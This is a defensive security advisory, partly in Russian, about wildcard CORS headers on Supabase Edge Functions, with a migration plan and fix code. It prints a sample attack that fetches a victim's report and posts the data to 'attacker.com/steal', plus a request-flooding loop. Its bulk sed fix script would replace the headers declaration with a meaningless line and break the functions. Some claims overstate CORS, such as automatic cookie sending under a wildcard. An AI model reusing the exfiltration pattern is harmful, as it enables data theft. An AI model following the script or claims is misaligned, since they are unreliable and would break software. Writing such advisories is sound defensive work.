# CORS Security Analysis and Fix Plan

## 🚨 Critical Security Issue Found

### Problem Overview

**30+ Edge Functions** currently use wildcard CORS:
```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',  // ❌ DANGEROUS!
};
```

This allows **ANY website** to call your Edge Functions, creating serious security vulnerabilities.

---

## ⚠️ Why Wildcard CORS (`*`) is Dangerous

### 1. **Cross-Site Request Forgery (CSRF) Risk**

**Scenario:**
```
User visits malicious-site.com
↓
malicious-site.com makes request to:
https://uzcmaxfhfcsxzfqvaloz.supabase.co/functions/v1/ai-orchestrator
↓
Request succeeds because CORS allows ANY origin (*)
↓
Attacker can access user's data, execute queries, etc.
```

**Real-world impact:**
- Злоумышленник может вызвать ваши функции со своего сайта
- Пользователь даже не узнает об этом
- Аутентификация не защищает, т.к. браузер передает cookies/tokens автоматически

### 2. **Data Exfiltration**

```javascript
// На сайте attacker.com:
fetch('https://your-project.supabase.co/functions/v1/generate-report', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + stolenToken,  // Украденный токен
  },
  body: JSON.stringify({ database_id: 'victim-db' })
})
.then(r => r.json())
.then(data => {
  // Отправляем данные на сервер злоумышленника
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Что происходит:**
- Злоумышленник получает ваши данные
- Может экспортировать базы данных
- Может читать конфиденциальную информацию

### 3. **Resource Exhaustion (DDoS)**

```javascript
// Злоумышленник может создать сайт, который:
for (let i = 0; i < 10000; i++) {
  fetch('https://your-project.supabase.co/functions/v1/ai-orchestrator', {
    method: 'POST',
    body: JSON.stringify({ /* expensive query */ })
  });
}
```

**Последствия:**
- Израсходуются все credits
- Функции станут недоступны для реальных пользователей
- Финансовые потери

### 4. **API Abuse**

Без ограничения origin, любой может:
- Использовать ваши AI функции (дорогие токены)
- Загружать файлы в ваше хранилище
- Создавать spam записи в БД
- Отправлять уведомления от вашего имени

---

## 📊 Current State Analysis

### Functions with Wildcard CORS

Found **30+** functions using `'Access-Control-Allow-Origin': '*'`:

1. `ai-analyze-schema` ❌
2. `ai-create-schema` ❌
3. `ai-import-suggestions` ❌
4. `ai-orchestrator` ❌ **← CRITICAL (AI queries)**
5. `check-subscription` ❌
6. `composite-views-*` ❌
7. `create-checkout` ❌ **← CRITICAL (payments)**
8. `customer-portal` ❌ **← CRITICAL (payments)**
9. `evaluate-formula` ❌
10. `generate-report` ❌ **← CRITICAL (data export)**
11. `item-attachment-*` ❌
12. ... and 20+ more

### Severity by Function Type

| Function Type | Severity | Why |
|--------------|----------|-----|
| **AI Functions** (ai-orchestrator, etc.) | 🔴 CRITICAL | Expensive API calls, data queries |
| **Payment Functions** (stripe, checkout) | 🔴 CRITICAL | Financial transactions |
| **Data Export** (generate-report) | 🔴 CRITICAL | Data exfiltration risk |
| **Database Operations** (composite-views) | 🟠 HIGH | Data manipulation |
| **Telegram/Notifications** | 🟡 MEDIUM | Spam risk |
| **Storage** (attachments) | 🟡 MEDIUM | Storage abuse |

---

## ✅ Correct CORS Implementation

### Already Available: `_shared/security.ts`

You already have a **secure CORS implementation**:

```typescript
// supabase/functions/_shared/security.ts

const ALLOWED_ORIGINS = [
  'http://localhost:5173',              // Dev
  'http://localhost:3000',              // Dev alt
  'https://app.dataparsedesk.com',      // Production
  'https://dataparsedesk.com',          // Production
  'https://staging.dataparsedesk.com',  // Staging
];

function getAllowedOrigin(req: Request): string {
  const origin = req.headers.get('origin');

  // Allow any localhost in development
  if (origin && origin.startsWith('http://localhost:')) {
    return origin;
  }

  // Check whitelist
  if (origin && ALLOWED_ORIGINS.includes(origin)) {
    return origin;
  }

  // Default to production
  return ALLOWED_ORIGINS[ALLOWED_ORIGINS.length - 1];
}

export function getCorsHeaders(req: Request): Record<string, string> {
  return {
    'Access-Control-Allow-Origin': getAllowedOrigin(req),
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Credentials': 'true',
  };
}
```

**Benefits:**
✅ Only allows requests from YOUR domains
✅ Flexible for development (any localhost)
✅ Supports staging and production
✅ Prevents CSRF attacks
✅ Prevents data exfiltration

---

## 🛠️ Fix Implementation

### Example: ai-orchestrator

**Before (INSECURE):**
```typescript
// ai-orchestrator/index.ts
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',  // ❌ Anyone can call!
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};
```

**After (SECURE):**
```typescript
// ai-orchestrator/index.ts
import { getCorsHeaders } from '../_shared/security.ts';

// Later in handler:
const corsHeaders = getCorsHeaders(req);
```

### Full Example

```typescript
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.75.0';
import { getCorsHeaders, handleCorsPrelight } from '../_shared/security.ts';

serve(async (req) => {
  // Get secure CORS headers
  const corsHeaders = getCorsHeaders(req);

  // Handle OPTIONS preflight
  if (req.method === 'OPTIONS') {
    return handleCorsPrelight(req);
  }

  try {
    // Your logic here
    const data = { result: 'success' };

    return new Response(
      JSON.stringify(data),
      {
        status: 200,
        headers: corsHeaders  // ✅ Secure headers
      }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: corsHeaders
      }
    );
  }
});
```

---

## 📋 Migration Plan

### Phase 1: Critical Functions (Priority 1)
**Impact: High, Risk: Critical**

1. `ai-orchestrator` - AI queries (expensive)
2. `create-checkout` - Payment processing
3. `customer-portal` - Payment management
4. `stripe-webhook` - Payment webhooks
5. `generate-report` - Data export
6. `rest-api` - Full API access

**Timeline:** Immediate (today)

### Phase 2: High-Risk Functions (Priority 2)
**Impact: Medium-High, Risk: High**

7. `ai-analyze-schema`
8. `ai-create-schema`
9. `ai-import-suggestions`
10. `generate-scheduled-report`
11. `composite-views-*` (3 functions)
12. `item-attachment-*` (2 functions)

**Timeline:** This week

### Phase 3: Remaining Functions (Priority 3)
**Impact: Medium, Risk: Medium**

All other functions (~15 more)

**Timeline:** Next week

---

## 🔧 Automated Fix Script

```bash
#!/bin/bash
# Fix CORS in Edge Functions

FUNCTIONS=(
  "ai-orchestrator"
  "ai-analyze-schema"
  "ai-create-schema"
  # Add more...
)

for func in "${FUNCTIONS[@]}"; do
  echo "Fixing $func..."

  # Add import if not present
  if ! grep -q "getCorsHeaders" "supabase/functions/$func/index.ts"; then
    # Add import at top
    sed -i '' "1a\\
import { getCorsHeaders, handleCorsPrelight } from '../_shared/security.ts';
" "supabase/functions/$func/index.ts"
  fi

  # Replace hardcoded CORS
  sed -i '' "s/const corsHeaders = {.*$/const getCorsHeadersFromReq = true; \/\/ Use dynamic CORS/" \
    "supabase/functions/$func/index.ts"
done
```

---

## 📊 Risk Assessment

### Before Fix

| Risk Type | Likelihood | Impact | Overall |
|-----------|------------|--------|---------|
| CSRF Attack | 🔴 High | 🔴 Critical | 🔴 **CRITICAL** |
| Data Theft | 🔴 High | 🔴 Critical | 🔴 **CRITICAL** |
| Credit Abuse | 🟠 Medium | 🔴 Critical | 🔴 **HIGH** |
| DDoS | 🟠 Medium | 🟠 High | 🟠 **HIGH** |

### After Fix

| Risk Type | Likelihood | Impact | Overall |
|-----------|------------|--------|---------|
| CSRF Attack | 🟢 Low | 🟢 Low | 🟢 **LOW** |
| Data Theft | 🟢 Low | 🟢 Low | 🟢 **LOW** |
| Credit Abuse | 🟢 Low | 🟡 Medium | 🟡 **LOW-MEDIUM** |
| DDoS | 🟡 Medium | 🟡 Medium | 🟡 **MEDIUM** |

---

## 🎯 Expected Impact of Fix

### Security Impact
✅ **CSRF Prevention**: Only your domains can call functions
✅ **Data Protection**: Prevents unauthorized data access
✅ **Cost Protection**: Prevents API abuse
✅ **Compliance**: Meets security best practices

### Performance Impact
✅ **No negative impact** - CORS is handled at HTTP layer
✅ **Slightly better** - Fewer malicious requests

### User Experience Impact
✅ **No impact** for legitimate users
✅ **Legitimate domains continue to work**
✅ **Better security = better trust**

### Development Impact
⚠️ **Minor inconvenience** - Need to add new domains to whitelist
✅ **Clear process** - Update `ALLOWED_ORIGINS` in one place
✅ **Localhost always works** - No impact on dev workflow

---

## 🚀 Deployment Strategy

### 1. Test in Staging
```bash
# Deploy to staging first
supabase functions deploy ai-orchestrator --project-ref staging-project

# Test from allowed origins
curl -H "Origin: https://staging.dataparsedesk.com" \
  https://staging-project.supabase.co/functions/v1/ai-orchestrator

# Should work ✅

# Test from disallowed origin
curl -H "Origin: https://malicious-site.com" \
  https://staging-project.supabase.co/functions/v1/ai-orchestrator

# Should get CORS error ✅
```

### 2. Gradual Rollout
- Day 1: Critical functions (ai-orchestrator, payments)
- Day 2-3: High-risk functions (AI, data export)
- Day 4-7: All remaining functions

### 3. Monitoring
```bash
# Monitor for CORS errors in logs
supabase functions logs ai-orchestrator --level error | grep CORS

# Check for legitimate requests being blocked
# (Should be none if ALLOWED_ORIGINS is correct)
```

---

## 📚 Additional Security Recommendations

### 1. Add Rate Limiting
Use the existing rate limiting in `_shared/security.ts`:

```typescript
import { checkRateLimit } from '../_shared/security.ts';

const rateLimit = checkRateLimit(
  clientIp,
  100,    // Max 100 requests
  60000   // Per minute
);

if (!rateLimit.allowed) {
  return new Response('Rate limit exceeded', {
    status: 429,
    headers: corsHeaders
  });
}
```

### 2. Validate JWT Tokens
Already configured in `supabase/config.toml` ✅

### 3. Add Request Signing
For webhooks (Stripe, Telegram), verify signatures:

```typescript
import { verifyWebhookSignature } from '../_shared/security.ts';

const isValid = await verifyWebhookSignature(
  payload,
  signature,
  secret
);
```

---

## ✅ Checklist

### Before Deployment
- [ ] Review `ALLOWED_ORIGINS` list
- [ ] Add your production domain
- [ ] Add staging domain if needed
- [ ] Test locally
- [ ] Test in staging

### During Deployment
- [ ] Deploy critical functions first
- [ ] Monitor logs for errors
- [ ] Test from production domain
- [ ] Verify OPTIONS requests work

### After Deployment
- [ ] Monitor for CORS errors
- [ ] Check legitimate requests work
- [ ] Document changes
- [ ] Update team

---

## 📞 Resources

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP: CSRF](https://owasp.org/www-community/attacks/csrf)
- [Supabase Edge Functions Security](https://supabase.com/docs/guides/functions/security)

---

## 🎯 Summary

**Current State:**
- 🔴 30+ functions with wildcard CORS
- 🔴 Critical security vulnerability
- 🔴 Open to CSRF, data theft, abuse

**After Fix:**
- ✅ Origin whitelist enforced
- ✅ Only your domains allowed
- ✅ CSRF protection
- ✅ Data protection
- ✅ Cost protection

**Action Required:**
1. Fix critical functions IMMEDIATELY
2. Roll out to all functions this week
3. Monitor and test

**Status:** 🔴 **URGENT - Requires immediate attention**
